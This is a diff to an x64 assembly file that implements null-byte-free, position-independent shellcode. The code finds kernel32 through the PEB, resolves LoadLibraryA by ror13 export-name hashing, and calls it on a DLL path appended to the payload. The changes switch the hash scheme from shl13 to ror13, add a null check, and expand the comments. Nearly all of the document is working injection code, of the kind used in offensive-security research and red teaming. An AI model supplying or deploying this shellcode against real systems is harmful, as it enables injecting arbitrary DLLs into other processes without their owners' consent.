@@ -1,16 +1,24 @@
 ;
 ; shLoadLibraryA-x64.asm
 ;
-; refer to https://en.wikipedia.org/wiki/Win32_Thread_Information_Block for details
-; also, TEB and PEB can be studied with expression (_TEB*)fs in Visual Studio "Watch" windows during debug.
-; and moreover, some Reserved structure fields names can be obtained with pdbdump utility on MS pdbs with public symbols.
+; Refer to https://en.wikipedia.org/wiki/Win32_Thread_Information_Block for details
+; Note, TEB and PEB can be studied with expression (_TEB*)fs in Visual Studio "Watch" windows during debug.
+; Moreover, some Reserved structure fields names can be obtained with pdbdump utility on MS pdbs with public symbols.
 ;
 
 public shLoadLibraryA
-public dllName
 
 .code
 
+    ;
+    ; shLoadLibraryA
+    ;
+    ; This routine is the main entry point of the shellcode.
+    ;     The code aligns the stack, then finds its start address and calls some utilit routines.
+    ;
+    ; Parameters:
+    ;     None. The ascii string must be appended to the end of the code, where the code will find it under dllName.
+    ;
     shLoadLibraryA proc
         sub     rsp, 028h               ;// 40 bytes of shadow space: 32 for RCX, RDX, R8 and R9 registers, and 8 bytes.
                                         ;// To align the stack from previous usage - the return RIP address pushed on the stack.
@@ -34,7 +42,7 @@ public dllName
         neg     rcx                     ;// To avoid null bytes. rcx = the relative offset of getProcAddressAsm symbol.
         add     r10, rcx                ;// Make the address of the getProcAddressAsm symbol absolute by adding the base address to it.
         mov     rcx, rax                ;// rcx = pKernel32Base, fist argument for the getProcAddressAsm function.
-        mov     rdx, 07203081c80f2041h  ;// rdx = hash of "LoadLibraryA" string, obtained by shl13 hashing approach. Second pararmeter for getProcAddressAsm.
+        mov     rdx, 0C6042601260A288Dh ;// rdx = hash of "LoadLibraryA" string, obtained by ror13 hashing approach. Second pararmeter for getProcAddressAsm.
         call    r10                     ;// Call getProcAddressAsm, after the call rax = pLoadLibraryA, or zero.
 
       lSplit:
@@ -45,16 +53,27 @@ public dllName
         neg     r12                     ;// r12 = The size of the second chunk of the shellcode.
         add     rdx, r12                ;// rdx = The total size of the shellcode, from shLoadLibraryA symbol to dllName symbol.
         add     rcx, rdx                ;// Make the address of the dllName symbol absolute by adding the base address to it.
-        call    rax                     ;// call LoadLibraryA(dllName)
+        test    rax, rax                ;// Check for the value of the LoadLibraryA pointer.
+        jz      lExit                   ;// If ZF is set, then exit gracefully to not crash the program. Otherwise,
+        call    rax                     ;// call LoadLibraryA(dllName).
 
-        add     rsp, 028h
+      lExit:
+        add     rsp, 028h               ;// Cleanup the registers shadow space on the stack.
         ret
     shLoadLibraryA endp
 
 
+    ;
+    ; getKernel32Base
+    ;
+    ; This routine accesses TEB and obtains the base pointer of the kernel32.dll's PE image, that is loaded in memory.
+    ;
+    ; Parameters:
+    ;     None.
+    ;
     getKernel32Base proc
-        push    rsi
-        xor     rax, rax
+        push    rsi                     ;// Save the rsi value on the stack, because rsi register will be used by lods instructions below.
+        xor     rax, rax                ;// Set initial value to zero.
         mov     rax, gs:[rax+060h]      ;// _TEB.Peb (_PEB* Peb)
         mov     rax, [rax+018h]         ;// _PEB.Ldr (_PEB_LDR_DATA* Ldr)
         mov     rsi, [rax+020h]         ;// _PEB_LDR_DATA.InLoadOrderModuleList (_LIST_ENTRY InLoadOrderModuleList)
@@ -62,23 +81,31 @@ public dllName
         mov     rsi, rax                ;// to avoid zeroes in code
         lodsq                           ;// _LDR_DATA_TABLE_ENTRY* of kernel32
         mov     rax, [rax+020h]         ;// _LDR_DATA_TABLE_ENTRY.DllBase
-        pop	    rsi
+        pop	    rsi                     ;// Restore the value of rsi to the one, that is held before entering the getKernel32Base routine.
         ret
     getKernel32Base endp
 
 
-    ; rcx - image base
-    ; rdx - shl13 hash
+    ;
+    ; getProcAddressAsm
+    ;
+    ; This routine is similar to Kernel32.dll!GetProcAddress(HMODULE, LPCSTR), but it accepts ror13 hashes
+    ;     instead of the ascii string and it does not support Forwarded Exported symbols.
+    ;
+    ; Parameters:
+    ;     rcx = image base
+    ;     rdx = ror13 hash
+    ;
     getProcAddressAsm proc
         movsxd  rax, dword ptr [rcx+3Ch];// Skip over the MSDOS header to the start of the PE header. rax = PIMAGE_DOS_HEADER->e_lfanew.
-        xor     r11d, r11d              ;// Counter ? 
-        mov     rsi, rdx                ;// Store the 'shift left for 13 bits' hash of the function name in rsi.
+        xor     r11d, r11d              ;// Initialize to zero the counter of the entries in the AddressOfFunctions/AddressOfNames tables.
+        mov     rsi, rdx                ;// Store the 'rotate right for 13 bits' hash of the function name in rsi.
         mov     r10, rcx                ;// Store the image base address in r10.
-        mov     r13, 0 - 088h           ;// To avoid null bytes. In r13 the VA of IMAGE_DIRECTORY_ENTRY_EXPORT will be calculated by the next instructions.
-        neg     r13                     ;// r13 = 088h. The IMAGE_DATA_DIRECTORY is 0x88 bytes from the start of the PE64 header.
-        add     r13, rax                ;// Added the offset from the PE image base to the PE64 headers.
-        add     r13, rcx                ;// Make the IMAGE_DIRECTORY_ENTRY_EXPORT address absolute by adding the base address to it.
-        mov     r8d, [r13]              ;// Extract the relative address (RVA) of IMAGE_EXPORT_DIRECTORY, as it is the first one in IMAGE_DIRECTORY_ENTRY_EXPORT.
+        mov     r14, 0 - 088h           ;// To avoid null bytes. In r14 the VA of IMAGE_DIRECTORY_ENTRY_EXPORT will be calculated by the next instructions.
+        neg     r14                     ;// r14 = 088h. The IMAGE_DATA_DIRECTORY is 0x88 bytes from the start of the PE64 header.
+        add     r14, rax                ;// Added the offset from the PE image base to the PE64 headers.
+        add     r14, rcx                ;// Make the IMAGE_DIRECTORY_ENTRY_EXPORT address absolute by adding the base address to it.
+        mov     r8d, [r14]              ;// Extract the relative address (RVA) of IMAGE_EXPORT_DIRECTORY, as it is the first one in IMAGE_DIRECTORY_ENTRY_EXPORT.
         mov     eax, [r8+rcx+20h]       ;// Extract the AddressOfNames table relative offset and store in eax.
         mov     edi, [r8+rcx+18h]       ;// Extract the NumberOfNames, number of exported items and store it in edi which will be used as the counter.
         mov     ebx, [r8+rcx+1Ch]       ;// Extract the AddressOfFunctions table relative offset, make this address absolute and store it in ebx.
@@ -92,13 +119,12 @@ public dllName
         mov     edx, dword ptr [r9]     ;// Extract relative offset (RVA) of the next function name.
         add     r8, r10                 ;// Make the function body address absolute (RVA -> VA) by adding the image base address to it.
         add     rdx, r10                ;// Make the function name address absolute (RVA -> VA) by adding the image base address to it.
-        ;je      lCompareHash            ; 74 16
       lNextChar:
         mov     rax, [rdx]              ;// To avoid null bytes.
         test    al, al                  ;// Test for the end of the function name.
         je      lCompareHash            ;// If ZF is set the end of the string has been reached. Jump to the end of the hash calculation.
         movsx   rax, byte ptr [rdx]     ;// Get the next function name character to rax.
-        shl     rcx, 0Dh                ;// Shift the current value of the hash 13 bits to the left.
+        ror     rcx, 0Dh                ;// Rotate the current value of the hash 13 bits to the right.
         add     rcx, rax                ;// Add new character to the hash value.
         add     rdx, 1                  ;// Increment the character index pointer inside the function name string.
         jne     lNextChar               ;// Proceed to the next character in the function name.
@@ -119,11 +145,26 @@ public dllName
     getProcAddressAsm endp
 
 
+    ;
+    ; dllName
+    ;
+    ; This piece of data is the terminating null byte of the shellcode.
+    ; And this is where the asciiz string with full path to dll name must be appended by the caller.
+    ;
     dllName	    db 0                    ;// "ws2_32.dll",0 ; To quickly test the shellcode, uncomment this instead of the zero in "db 0" expression. 
 
 
+    ;
+    ; stringToRor13Hash
+    ;
+    ; This routine is not part of the shellcode.
+    ; But it's rather the utility function to produce  ror13 hashes of the string passed in rcx.
+    ;
+    ; Parameters:
+    ;     rcx = ascii string to hash
+    ;
     stringToRor13Hash proc              ;// rcx - the pointer to the ascii string.
-        mov     rsi, rcx                ;// ror13: 0xC6042601260A288D, rol13: 0x07203081c80f2041.
+        mov     rsi, rcx                ;// ror13: 0xC6042601260A288D for LoadLibraryA
         xor     rdi, rdi                ;// Zero rdi as it will hold the hash value for the current symbols function name.
         xor     rax, rax                ;// Zero rax in order to ensure that the high order bytes are zero as this will hold the resulting hash.
         cld
